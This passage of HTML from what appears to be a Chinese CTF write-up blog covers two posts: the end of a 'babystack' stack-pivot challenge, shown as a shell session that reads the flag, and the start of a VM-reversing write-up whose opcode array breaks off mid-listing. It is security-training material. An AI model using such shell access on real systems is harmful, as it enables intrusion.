<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sh 1&gt;&amp;0</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> home</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span></span></span><br><span class="line">babystack</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> babystack</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span></span></span><br><span class="line">babystack</span><br><span class="line">flag</span><br><span class="line">run.sh</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> flag</span></span><br><span class="line">flag&#123;Very_3asy_st@ck_piv0t_challenge_right&#125;</span><br></pre></td></tr></table></figure>



<h2 id="wxpage"><a href="#wxpage" class="headerlink" title="wxpage"></a>wxpage</h2><p>hook_mem64 限制读取的内存范围在0x1235000~0x1236000</p>
<p>hook_syscall 限制系统调用</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/01/25/2021bamboofox/" data-id="cuidEpeTFltH46KJzYeUcGmoR" data-title="2021 ACSC CTF" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-qwb2020-re" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/11/06/qwb2020-re/" class="article-date">
  <time class="dt-published" datetime="2020-11-06T02:50:24.000Z" itemprop="datePublished">2020-11-06</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/11/06/qwb2020-re/">qwb2020-re</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>感觉比2019年的难多了</p>
<h1 id="2020-re-firmware"><a href="#2020-re-firmware" class="headerlink" title="2020 re firmware"></a>2020 re firmware</h1><p>411820</p>
<p>400620</p>
<p>4006a8</p>
<p>4006fc</p>
<style>.gdfbigphgbig{zoom:67%;}</style><img src="/2020/11/06/qwb2020-re/1763434247559-17.png" class="gdfbigphgbig" alt="img">

<p>取s1地址处第一个字节&lt;&lt;2 + v0</p>
<p>为了调用函数</p>
<p>42a9b0 400ad0 400af0  </p>
<p>sub_4184E0</p>
<p>经过调试分析，大致可以判断本题为VM逆向，dispatcher位于函数sub_400620中，即地址0x400828处</p>
<style>.ripepzsazjco{zoom:67%;}</style><img src="/2020/11/06/qwb2020-re/1763434247558-1.png" class="ripepzsazjco" alt="img">

<p>然后obopcode 即为地址0x4B2020处数值，此处取值调用函数，操作一共有 ^ - + * load 几种，编写代码模拟运行并使用z3求解：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">opcode = [<span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x67</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3A</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x8C</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x50</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3A</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x7A</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x4E</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x6F</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x7E</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x02</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x42</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3A</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x47</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x5C</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x43</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3A</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x1F</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x2D</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3A</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x5A</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x02</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x2B</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x3A</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x3A</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x32</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3A</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x64</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x6C</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x39</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3A</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x6A</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3A</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x74</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x3A</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0xC8</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x58</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3A</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x6F</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3A</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span 